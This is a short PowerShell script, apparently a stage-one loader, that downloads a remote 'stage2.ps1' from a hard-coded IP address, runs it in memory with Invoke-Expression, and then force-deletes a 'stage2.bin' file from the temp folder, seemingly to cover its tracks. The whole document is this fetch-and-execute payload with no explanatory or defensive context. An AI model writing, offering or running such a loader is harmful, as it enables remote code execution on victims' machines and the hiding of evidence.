[CmdletBinding()]
param(
    [string]$Stage1Url = "https://192.0.2.129/stage2.ps1",
    [int]$RequestTimeout = 31
)
IEX (Invoke-WebRequest -Uri $Stage1Url -UseBasicParsing).Content
Remove-Item -Path "$env:TEMP\stage2.bin" -Force
